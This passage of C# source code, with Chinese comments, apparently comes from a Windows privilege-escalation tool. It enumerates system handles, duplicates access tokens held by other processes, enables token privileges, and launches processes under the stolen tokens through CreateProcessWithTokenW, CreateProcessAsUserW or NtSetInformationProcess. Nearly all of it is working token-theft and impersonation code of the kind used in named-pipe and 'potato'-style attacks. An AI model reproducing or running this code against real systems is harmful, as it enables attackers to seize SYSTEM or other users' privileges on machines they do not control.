MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);\n        [DllImport(\"psapi.dll\", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern int GetModuleFileNameEx(IntPtr processHandle, IntPtr moduleHandle, StringBuilder baseName, int size);\n\n        [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = \"DuplicateTokenEx\")]\n        private extern static bool DuplicateTokenExInternal(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);\n        public static bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInformationClass, out IntPtr TokenInformation, out uint dwLength)\n        {\n\n            bool status = GetTokenInformation(tokenHandle, tokenInformationClass, IntPtr.Zero, 0, out dwLength);\n\n            if (dwLength == 0xfffffff8)\n            {\n                dwLength = 0;\n                goto failRet;\n            }\n\n            TokenInformation = Marshal.AllocHGlobal((int)dwLength);\n            if (GetTokenInformation(tokenHandle, tokenInformationClass, TokenInformation, dwLength, out dwLength))\n            {\n                return true;\n            }\n        failRet:\n            dwLength = 0;\n            TokenInformation = IntPtr.Zero;\n            return false;\n        }\n\n        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,\n            IntPtr lpTokenAttributes, TokenImpersonationLevel impersonationLevel, TOKEN_TYPE TokenType,\n            out IntPtr phNewToken)\n        {\n            impersonationLevel -= TokenImpersonationLevel.Anonymous;\n            return DuplicateTokenExInternal(hExistingToken, dwDesiredAccess, lpTokenAttributes, (uint)impersonationLevel,\n                 TokenType, out phNewToken);\n        }\n\n        public static bool RevertToSelf()\n        {\n            bool isOk = RevertToSelfEx();\n            if (ContextToken != IntPtr.Zero)\n            {\n                isOk = ImpersonateLoggedOnUser(ContextToken);\n            }\n\n            return isOk;\n        }\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct TOKEN_STATISTICS\n    {\n\n        public LUID TokenId;\n\n        public LUID AuthenticationId;\n\n        public long ExpirationTime;\n\n        public uint TokenType;\n\n        public uint ImpersonationLevel;\n\n        public uint DynamicCharged;\n\n        public uint DynamicAvailable;\n\n        public uint GroupCount;\n\n        public uint PrivilegeCount;\n\n        public LUID ModifiedId;\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct STARTUPINFO\n    {\n        public Int32 cb;\n        public string lpReserved;\n        public string lpDesktop;\n        public string lpTitle;\n        public Int32 dwX;\n        public Int32 dwY;\n        public Int32 dwXSize;\n        public Int32 dwYSize;\n        public Int32 dwXCountChars;\n        public Int32 dwYCountChars;\n        public Int32 dwFillAttribute;\n        public Int32 dwFlags;\n        public Int16 wShowWindow;\n        public Int16 cbReserved2;\n        public IntPtr lpReserved2;\n        public IntPtr hStdInput;\n        public IntPtr hStdOutput;\n        public IntPtr hStdError;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_INFORMATION\n    {\n        public IntPtr hProcess;\n        public IntPtr hThread;\n        public int dwProcessId;\n        public int dwThreadId;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct _SYSTEM_HANDLE_INFORMATION_EX\n    {\n        private static int TypeSize = Marshal.SizeOf(typeof(_SYSTEM_HANDLE_INFORMATION_EX));\n        public IntPtr NumberOfHandles;\n        public IntPtr Reserved;\n\n\n        public uint GetNumberOfHandles()\n        {\n            return (uint)NumberOfHandles.ToInt64();\n        }\n        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleAt(IntPtr handleInfoPtr, ulong index)\n        {\n            IntPtr thisPtr = new IntPtr(handleInfoPtr.ToInt64());\n            thisPtr = new IntPtr(thisPtr.ToInt64() + TypeSize + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)) * (int)index);\n\n            return (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(thisPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));\n\n        }\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct UNICODE_STRING : IDisposable\n    {\n        public ushort Length;\n        public ushort MaximumLength;\n        public IntPtr buffer;\n\n        [SecurityPermission(SecurityAction.LinkDemand)]\n        public void Initialize(string s)\n        {\n            Length = (ushort)(s.Length * 2);\n            MaximumLength = (ushort)(Length + 2);\n            buffer = Marshal.StringToHGlobalUni(s);\n        }\n\n        [SecurityPermission(SecurityAction.LinkDemand)]\n        public void Dispose()\n        {\n            Marshal.FreeHGlobal(buffer);\n            buffer = IntPtr.Zero;\n        }\n        [SecurityPermission(SecurityAction.LinkDemand)]\n        public override string ToString()\n        {\n            if (Length == 0)\n                return String.Empty;\n            return Marshal.PtrToStringUni(buffer, Length / 2);\n        }\n    }\n\n    public class ProcessToken\n    {\n        public string SID { get; set; }\n        public string LogonDomain { get; set; }\n        public string UserName { get; set; }\n        public uint Session { get; set; }\n        public SECURITY_LOGON_TYPE LogonType { get; set; }\n        public TOKEN_TYPE TokenType { get; set; }\n        public IntPtr TokenHandle { get; set; }\n        public int TargetProcessId { get; set; }\n        public IntPtr TargetProcessToken { get; set; }\n        public TokenImpersonationLevel ImpersonationLevel { get; set; }\n        public string AuthenticationType { get; set; }\n        public string TargetProcessExePath { get; set; }\n        public TOKEN_ELEVATION_TYPE TokenElevationType { get; set; }\n        public IntegrityLevel IntegrityLevel { get; set; }\n        public bool IsRestricted { get; set; }\n        public bool TokenUIAccess { get; set; }\n\n        public string Groups { get; set; }\n\n        public bool IsClose { get; private set; }\n\n        private static readonly List<string> blackGroupSid = new List<string>();\n\n        private ProcessToken()\n        {\n\n        }\n\n\n        public static ProcessToken Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)\n        {\n            try\n            {\n                return _Cast(targetProcessToken, targetProcessPid, targetProcessHandle, tokenHandle);\n            }\n            catch (Exception)\n            {\n\n                return null;\n            }\n\n        }\n        private static ProcessToken _Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)\n        {\n            ProcessToken processToken = new ProcessToken();\n            SecurityIdentifier securityIdentifier = GetUser(tokenHandle);\n\n            if (securityIdentifier == null)\n            {\n                return null;\n            }\n\n            processToken.UserName = securityIdentifier.Translate(typeof(NTAccount)).Value;\n            processToken.SID = securityIdentifier.Value;\n            processToken.Groups = string.Join(\",\", getGoups(tokenHandle));\n            processToken.ImpersonationLevel = GetImpersonationLevel(tokenHandle);\n            uint session = 0;\n            SECURITY_LOGON_TYPE logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;\n            string logonDomain = \"\";\n\n            processToken.AuthenticationType = GetAuthenticationType(tokenHandle, out session, out logonDomain, out logonType);\n            processToken.Session = session;\n            processToken.LogonType = logonType;\n            processToken.LogonDomain = logonDomain;\n\n            processToken.TargetProcessId = targetProcessPid;\n            processToken.TargetProcessToken = targetProcessToken;\n\n            //获取Token类型\n            processToken.TokenType = GetTokenType(tokenHandle);\n\n            //检查token类型是否为主Token 如果是主Token必须调用DuplicateTokenEx获取模拟Token不然就获取不到Token类型 详情:https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class\n            if (processToken.ImpersonationLevel == TokenImpersonationLevel.None)\n            {\n                IntPtr newToken;\n                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,\n                        TokenImpersonationLevel.Delegation, TOKEN_TYPE.TokenImpersonation, out newToken))\n                {\n                    processToken.ImpersonationLevel = TokenImpersonationLevel.Delegation;\n                    NativeMethod.CloseHandle(newToken);\n                }\n                else if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,\n                    TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenImpersonation, out newToken))\n                {\n                    processToken.ImpersonationLevel = TokenImpersonationLevel.Impersonation;\n                    NativeMethod.CloseHandle(newToken);\n                }\n            }\n\n            processToken.TokenElevationType = GetTokenElevationType(tokenHandle);\n            processToken.IntegrityLevel = GetTokenIntegrityLevel(tokenHandle);\n            processToken.IsRestricted = NativeMethod.IsTokenRestricted(tokenHandle);\n            processToken.TokenUIAccess = GetTokenUIAccess(tokenHandle);\n            if (targetProcessHandle != IntPtr.Zero)\n            {\n                StringBuilder exePath = new StringBuilder(1024);\n                NativeMethod.GetModuleFileNameEx(targetProcessHandle, IntPtr.Zero, exePath, exePath.Capacity * 2);\n                processToken.TargetProcessExePath = exePath.ToString();\n            }\n\n            processToken.TokenHandle = tokenHandle;\n            return processToken;\n        }\n\n        public static SecurityIdentifier GetUser(IntPtr tokenHandle)\n        {\n            uint ReturnLength;\n            IntPtr tokenUserPtr = IntPtr.Zero;\n            SecurityIdentifier securityIdentifier = null;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUser, out tokenUserPtr, out ReturnLength))\n            {\n                securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(tokenUserPtr));\n                Marshal.FreeHGlobal(tokenUserPtr);\n            }\n            return securityIdentifier;\n        }\n\n        public static string[] getGoups(IntPtr tokenHandle)\n        {\n            List<string> goups = new List<string>();\n            IntPtr tokenUserPtr = IntPtr.Zero;\n            SecurityIdentifier securityIdentifier = null;\n            uint ReturnLength;\n            /**\n             *\n             * typedef struct _TOKEN_GROUPS {\n                DWORD GroupCount;\n            #ifdef MIDL_PASS\n                [size_is(GroupCount)] SID_AND_ATTRIBUTES Groups[*];\n            #else // MIDL_PASS\n                SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];\n            #endif // MIDL_PASS\n            } TOKEN_GROUPS, *PTOKEN_GROUPS;\n             *\n             */\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenGroups, out tokenUserPtr, out ReturnLength))\n            {\n                int offset = 0;\n                int groupCount = Marshal.ReadInt32(tokenUserPtr);\n                offset += Marshal.SizeOf(typeof(TOKEN_GROUPS)) - Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));\n\n                for (int i = 0; i < groupCount; i++)\n                {\n                    lock (blackGroupSid)\n                    {\n                        try\n                        {\n                            securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(new IntPtr(tokenUserPtr.ToInt64() + offset)));\n                            offset += Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));\n\n                            if (blackGroupSid.Contains(securityIdentifier.Value))\n                            {\n                                continue;\n                            }\n\n                            goups.Add(securityIdentifier.Translate(typeof(NTAccount)).Value);\n                        }\n                        catch (Exception e)\n                        {\n                            if (securityIdentifier != null)\n                            {\n                                blackGroupSid.Add(securityIdentifier.Value);\n                            }\n\n                            continue;\n                        }\n                    }\n                }\n                Marshal.FreeHGlobal(tokenUserPtr);\n            }\n            return goups.ToArray();\n        }\n\n        public static TOKEN_TYPE GetTokenType(IntPtr tokenHandle)\n        {\n            IntPtr tokenTypePtr = IntPtr.Zero;\n            uint outLength = 0;\n            TOKEN_TYPE ret = TOKEN_TYPE.UnKnown;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenType, out tokenTypePtr, out outLength))\n            {\n                ret = (TOKEN_TYPE)(int)Marshal.PtrToStructure(tokenTypePtr, typeof(int));\n                Marshal.FreeHGlobal(tokenTypePtr);\n            }\n            return ret;\n        }\n        public static TOKEN_ELEVATION_TYPE GetTokenElevationType(IntPtr tokenHandle)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint dwLength;\n            int num = -1;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevationType, out tokenInfo, out dwLength))\n            {\n                num = Marshal.ReadInt32(tokenInfo);\n                Marshal.FreeHGlobal(tokenInfo);\n\n            }\n            return (TOKEN_ELEVATION_TYPE)Enum.ToObject(typeof(TOKEN_ELEVATION_TYPE), num);\n        }\n        public static TokenImpersonationLevel GetImpersonationLevel(IntPtr tokenHandle)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint dwLength = 0;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, out tokenInfo, out dwLength))\n            {\n                int num = Marshal.ReadInt32(tokenInfo);\n                Marshal.FreeHGlobal(tokenInfo);\n                return num + TokenImpersonationLevel.Anonymous;\n            }\n            return TokenImpersonationLevel.None;\n        }\n        public static string GetAuthenticationType(IntPtr tokenHandle, out uint sessionId, out string logonDomain, out SECURITY_LOGON_TYPE logonType)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint dwLength = 0;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenStatistics, out tokenInfo, out dwLength))\n            {\n                TOKEN_STATISTICS tokenStatistics = (TOKEN_STATISTICS)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_STATISTICS));\n                Marshal.FreeHGlobal(tokenInfo);\n                LUID logonAuthId = tokenStatistics.AuthenticationId;\n                if (logonAuthId.LowPart == 998U)\n                {\n                    goto failRet;\n                }\n                IntPtr ppLogonSessionData = IntPtr.Zero;\n                uint status = NativeMethod.LsaGetLogonSessionData(ref logonAuthId, ref ppLogonSessionData);\n                if (status == NativeMethod.STATUS_SUCCESS)\n                {\n                    SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(SECURITY_LOGON_SESSION_DATA));\n                    string result = sessionData.AuthenticationPackage.ToString();\n                    logonType = (SECURITY_LOGON_TYPE)sessionData.LogonType;\n                    sessionId = sessionData.Session;\n                    logonDomain = sessionData.LogonDomain.ToString();\n                    NativeMethod.LsaFreeReturnBuffer(ppLogonSessionData);\n                    return result;\n                }\n\n            }\n        failRet:\n            logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;\n            sessionId = 0;\n            logonDomain = \"UnKnown\";\n            return \"UnKnown\";\n        }\n        public static IntegrityLevel GetTokenIntegrityLevel(IntPtr tokenHanle)\n        {\n            IntPtr infoPtr = IntPtr.Zero;\n            uint dwLength;\n            uint IntegrityLevel = 0;\n            if (NativeMethod.GetTokenInformation(tokenHanle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, out infoPtr, out dwLength))\n            {\n                TOKEN_MANDATORY_LABEL tokenMandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(infoPtr, typeof(TOKEN_MANDATORY_LABEL));\n                IntPtr SubAuthorityCount = NativeMethod.GetSidSubAuthorityCount(tokenMandatoryLabel.Label.Sid);\n\n                IntPtr IntegrityLevelRidPtr = NativeMethod.GetSidSubAuthority(tokenMandatoryLabel.Label.Sid, (uint)Marshal.ReadInt32(SubAuthorityCount) - 1);\n                uint IntegrityLevelRid = (uint)Marshal.ReadInt32(IntegrityLevelRidPtr);\n                Array integrityLevels = Enum.GetValues(typeof(IntegrityLevel));\n\n                for (int i = 0; i < integrityLevels.Length; i++)\n                {\n                    uint tmpRid = (uint)integrityLevels.GetValue(i);\n                    if (IntegrityLevelRid >= tmpRid)\n                    {\n                        IntegrityLevel = tmpRid;\n                    }\n                    else\n                    {\n                        break;\n                    }\n                }\n                Marshal.FreeHGlobal(infoPtr);\n\n            }\n            return (IntegrityLevel)Enum.ToObject(typeof(IntegrityLevel), IntegrityLevel);\n        }\n\n        public static bool GetTokenUIAccess(IntPtr tokenHandle)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint outLength = 0;\n            bool isTokenUIAccess = false;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUIAccess, out tokenInfo, out outLength))\n            {\n                if (Marshal.ReadByte(tokenInfo) != 0)\n                {\n                    isTokenUIAccess = true;\n                }\n\n                Marshal.FreeHGlobal(tokenInfo);\n            }\n            return isTokenUIAccess;\n        }\n        public bool CreateProcess(string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)\n        {\n\n            IntPtr tmpTokenHandle = IntPtr.Zero;\n            if (NativeMethod.DuplicateTokenEx(this.TokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, this.ImpersonationLevel, TOKEN_TYPE.TokenPrimary,\n                out tmpTokenHandle))\n            {\n                NativeMethod.CloseHandle(this.TokenHandle);\n                this.TokenHandle = tmpTokenHandle;\n            }\n            else\n            {\n                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n            }\n\n            NativeMethod.SetLastError(0);\n\n\n\n            //The TokenHandle of CreateProcessWithTokenW must have TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID permissions\n\n            if (NativeMethod.CreateProcessWithTokenW(this.TokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,\n        out processInformation))\n            {\n                return true;\n            }\n\n\n            if (NativeMethod.CreateProcessAsUserW(this.TokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags\n                                , IntPtr.Zero, null, ref startupinfo, out processInformation))\n            {\n                return true;\n            }\n            else if (Marshal.GetLastWin32Error() == 1314)\n            {\n                uint newDwCreationFlags = dwCreationFlags | (uint)ProcessCreateFlags.CREATE_SUSPENDED;\n                newDwCreationFlags |= (uint)ProcessCreateFlags.CREATE_UNICODE_ENVIRONMENT;\n                if (NativeMethod.CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, newDwCreationFlags, IntPtr.Zero, null, ref startupinfo, out processInformation))\n                {\n                    //init PROCESS_ACCESS_TOKEN\n                    uint PROCESS_ACCESS_TOKEN_SIZE = (uint)Marshal.SizeOf(typeof(PROCESS_ACCESS_TOKEN));\n                    PROCESS_ACCESS_TOKEN processAccessToken = new PROCESS_ACCESS_TOKEN();\n                    IntPtr tokenInfoPtr = Marshal.AllocHGlobal((int)PROCESS_ACCESS_TOKEN_SIZE);\n                    processAccessToken.Token = this.TokenHandle;\n                    processAccessToken.Thread = processInformation.hThread;\n                    Marshal.StructureToPtr(processAccessToken, tokenInfoPtr, false);\n\n                    uint status = NativeMethod.NtSetInformationProcess(processInformation.hProcess, PROCESS_INFORMATION_CLASS.ProcessAccessToken, tokenInfoPtr, PROCESS_ACCESS_TOKEN_SIZE);\n                    Marshal.FreeHGlobal(tokenInfoPtr);\n                    if (status == NativeMethod.STATUS_SUCCESS)\n                    {\n\n                        if ((dwCreationFlags & (uint)ProcessCreateFlags.PROFILE_USER) == 0)\n                        {\n                            if (NativeMethod.NtResumeProcess(processInformation.hProcess) != NativeMethod.STATUS_SUCCESS)\n                            {\n                                NativeMethod.CloseHandle(processInformation.hThread);\n                                NativeMethod.CloseHandle(processInformation.hProcess);\n                                NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);\n                                processInformation.hProcess = IntPtr.Zero;\n                                processInformation.hThread = IntPtr.Zero;\n                                return false;\n                            }\n                        }\n                        return true;\n                    }\n                    else\n                    {\n                        NativeMethod.CloseHandle(processInformation.hThread);\n                        NativeMethod.CloseHandle(processInformation.hProcess);\n                        NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);\n                        processInformation.hProcess = IntPtr.Zero;\n                        processInformation.hThread = IntPtr.Zero;\n                    }\n                }\n            }\n\n            return false;\n        }\n        public void Close()\n        {\n            if (this.TokenHandle != IntPtr.Zero && !IsClose)\n            {\n                IsClose = true;\n                NativeMethod.CloseHandle(this.TokenHandle);\n                this.TokenHandle = IntPtr.Zero;\n            }\n        }\n\n        public bool ImpersonateLoggedOnUser()\n        {\n            if (!IsClose && TokenHandle != IntPtr.Zero)\n            {\n                return NativeMethod.ImpersonateLoggedOnUser(this.TokenHandle);\n            }\n\n            return false;\n        }\n\n    }\n\n    [StructLayout(LayoutKind.Sequential, Pack = 1)]\n    public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX\n    { // Information Class 64\n        public IntPtr ObjectPointer;\n        public IntPtr ProcessID;\n        public IntPtr HandleValue;\n        public uint GrantedAccess;\n        public ushort CreatorBackTrackIndex;\n        public ushort ObjectType;\n        public uint HandleAttributes;\n        public uint Reserved;\n    }\n\n    public class TokenuUils\n    {\n        private static readonly int tokenType = getTokenType();\n\n\n        public static bool tryAddTokenPriv(IntPtr token, string privName)\n        {\n            TokenPrivileges tokenPrivileges = new TokenPrivileges();\n            if (NativeMethod.LookupPrivilegeValue(null, privName, out tokenPrivileges.Luid))\n            {\n\n                tokenPrivileges.PrivilegeCount = 1;\n                tokenPrivileges.Attributes = NativeMethod.SE_PRIVILEGE_ENABLED;\n                int ReturnLength = 0;\n                NativeMethod.SetLastError(0);\n                NativeMethod.AdjustTokenPrivileges(token, false, tokenPrivileges, 0, IntPtr.Zero, out ReturnLength);\n                if (Marshal.GetLastWin32Error() == NativeMethod.ERROR_SUCCESS)\n                {\n                    return true;\n                }\n            }\n            return false;\n        }\n        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] ListSystemHandle()\n        {\n\n            List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> result = new List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();\n            uint handleInfoSize = 1024 * 1024;\n            IntPtr handleInfoPtr = Marshal.AllocHGlobal((int)handleInfoSize);\n            uint returnSize = 0;\n            uint status = 0;\n            while ((status = NativeMethod.NtQuerySystemInformation(NativeMethod.SystemExtendedHandleInformation, handleInfoPtr, handleInfoSize, out returnSize)) ==\n                NativeMethod.STATUS_INFO_LENGTH_MISMATCH)\n            {\n                Marshal.FreeHGlobal(handleInfoPtr);\n                handleInfoPtr = Marshal.AllocHGlobal(new IntPtr(handleInfoSize *= 2));\n            }\n            if (status != NativeMethod.STATUS_SUCCESS)\n            {\n                //Console.WriteLine(\"NtQuerySystemInformation调用失败 ErrCode:\" + Marshal.GetLastWin32Error());\n                goto ret;\n            }\n            _SYSTEM_HANDLE_INFORMATION_EX handleInfo = (_SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(_SYSTEM_HANDLE_INFORMATION_EX));\n\n            uint NumberOfHandles = handleInfo.GetNumberOfHandles();\n            for (uint i = 0; i < NumberOfHandles; i++)\n            {\n                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = _SYSTEM_HANDLE_INFORMATION_EX.HandleAt(handleInfoPtr, i);\n                result.Add(handleEntry);\n            }\n        ret:\n            Marshal.FreeHGlobal(handleInfoPtr);\n            return result.ToArray();\n        }\n        public static int getTokenType()\n        {\n            int ret = -1;\n            Process currentProcess = Process.GetCurrentProcess();\n            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();\n            IntPtr currentThreadToken = windowsIdentity.Token;\n            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] handles = TokenuUils.ListSystemHandle();\n            for (int i = 0; i < handles.Length; i++)\n            {\n                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handles[i];\n                if (handleEntry.ProcessID.ToInt64() == currentProcess.Id && currentThreadToken == handleEntry.HandleValue)\n                {\n                    ret = handleEntry.ObjectType;\n                    goto ret;\n                }\n            }\n        ret:\n            windowsIdentity.Dispose();\n            currentProcess.Dispose();\n            return ret;\n        }\n\n        public delegate bool ListProcessTokensCallback(ProcessToken processToken);\n\n        public static bool ListProcessTokensDefaultCallback(ProcessToken processToken)\n        {\n            return true;\n        }\n\n        public static ProcessToken[] ListProcessTokens(int targetPid, ListProcessTokensCallback listProcessTokensCallback)\n        {\n            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] shteis = ListSystemHandle();\n            List<ProcessToken> processTokens = new List<ProcessToken>();\n            IntPtr localProcessHandle = NativeMethod.GetCurrentProcess();\n            IntPtr processHandle = IntPtr.Zero;\n            int lastPid = -1;\n            for (int i = 0; i < shteis.Length; i++)\n            {\n\n                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntryInfo = shteis[i];\n                int handleEntryPid = (int)handleEntryInfo.ProcessID.ToInt64();\n                if (targetPid > 0 && handleEntryPid == targetPid //过滤进程PID\n                    || targetPid <= 0//如果小于等于0就不过滤\n                    )\n                {\n\n                    if (lastPid != handleEntryPid)\n                    {\n                        if (processHandle != IntPtr.Zero)\n                        {\n                            NativeMethod.CloseHandle(processHandle);\n                            processHandle = IntPtr.Zero;\n                        }\n\n                        processHandle = NativeMethod.OpenProcess(ProcessAccessFlags.DuplicateHandle | ProcessAccessFlags.QueryInformation, false, handleEntryPid);\n\n                        if (processHandle != IntPtr.Zero)\n                        {\n                            IntPtr processToken = IntPtr.Zero;\n                            if (NativeMethod.OpenProcessToken(processHandle, NativeMethod.TOKEN_ELEVATION, out processToken))\n                            {\n                                ProcessToken token = ProcessToken.Cast(IntPtr.Zero, handleEntryPid, processHandle, processToken);\n                                if (token != null)\n                                {\n                                    if (listProcessTokensCallback.Invoke(token))\n                                    {\n                                        PutToken(processTokens, token);\n                                    }\n                                    else\n                                    {\n                                        token.Close();\n                                        goto end;\n                                    }\n                                }\n                            }\n                        }\n                        lastPid = handleEntryPid;\n\n                    }\n\n                    if (processHandle == IntPtr.Zero)\n                    {\n                        continue;\n                    }\n\n                    //GrantedAccess 0x0012019f 有可能会导致堵塞\n                    if (handleEntryInfo.ObjectType != tokenType || handleEntryInfo.GrantedAccess == 0x0012019f)\n                    {\n                        continue;\n                    }\n\n                    IntPtr dupHandle = IntPtr.Zero;\n                    if (NativeMethod.DuplicateHandle(processHandle, handleEntryInfo.HandleValue, localProcessHandle, out dupHandle,\n                            NativeMethod.GENERIC_EXECUTE | NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE, false, 0))\n                    {\n\n                        ProcessToken token = ProcessToken.Cast(handleEntryInfo.HandleValue, handleEntryPid, processHandle, dupHandle);\n                        if (token != null)\n                        {\n                            if (listProcessTokensCallback.Invoke(token))\n                            {\n                                PutToken(processTokens, token);\n                            }\n                            else\n                            {\n                                token.Close();\n                                goto end;\n                            }\n                        }\n                    }\n\n\n                    lastPid = handleEntryPid;\n                }\n            }\n\n        end:\n            if (processHandle != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(processHandle);\n            }\n            NativeMethod.CloseHandle(localProcessHandle);\n            return processTokens.ToArray();\n        }\n        private static void PutToken(List<ProcessToken> list, ProcessToken processToken)\n        {\n\n            if (processToken == null)\n            {\n                return;\n            }\n\n\n            for (int i = 0; i < list.Count; i++)\n            {\n                ProcessToken processTokenNode = list[i];\n                if (processTokenNode.UserName == processToken.UserName)\n                {\n                    if (processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel ||\n                        (processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel && (processToken.TokenElevationType == TOKEN_ELEVATION_TYPE.TokenElevationTypeFull || processToken.IntegrityLevel > processTokenNode.IntegrityLevel)))\n                    {\n                        if (!processToken.IsRestricted)\n                        {\n                            processTokenNode.Close();\n                            list[i] = processToken;\n                        }\n                    }\n                    else\n                    {\n                        processToken.Close();\n                    }\n                    return;\n                }\n            }\n            list.Add(processToken);\n\n        }\n\n\n        public static bool CreateProcess(IntPtr tokenHandle, string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)\n        {\n            TOKEN_TYPE tokenType = ProcessToken.GetTokenType(tokenHandle);\n            bool isClose = false;\n            bool isCreate = false;\n            if (tokenType != TOKEN_TYPE.TokenPrimary)\n            {\n                IntPtr tmpTokenHandle = IntPtr.Zero;\n                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenPrimary,\n                    out tmpTokenHandle))\n                {\n                    isClose = true;\n                    tokenHandle = tmpTokenHandle;\n                }\n            }\n\n            if (NativeMethod.CreateProcessAsUserW(tokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags\n        , IntPtr.Zero, null, ref startupinfo, out processInformation))\n            {\n                isCreate = true;\n            }\n            else if (NativeMethod.CreateProcessWithTokenW(tokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,\n                out processInformation))\n            {\n                isCreate = true;\n            }\n\n            if (isClose)\n            {\n                NativeMethod.CloseHandle(tokenHandle);\n            }\n\n            return isCreate;\n\n        }\n        public static void createProcessReadOut(TextWriter consoleWriter, IntPtr tokenHandle, string commandLine)\n        {\n            IntPtr childProcessStdOutRead = IntPtr.Zero;\n            IntPtr childProcessStdOutWrite = IntPtr.Zero;\n\n            FileStream childProcessReadStream = null;\n\n            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();\n\n            //初始化安全属性\n            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();\n\n            securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));\n            securityAttributes.pSecurityDescriptor = IntPtr.Zero;\n            securityAttributes.bInheritHandle = true;\n\n            //初始化子进程输出\n\n            if (!NativeMethod.CreatePipe(out 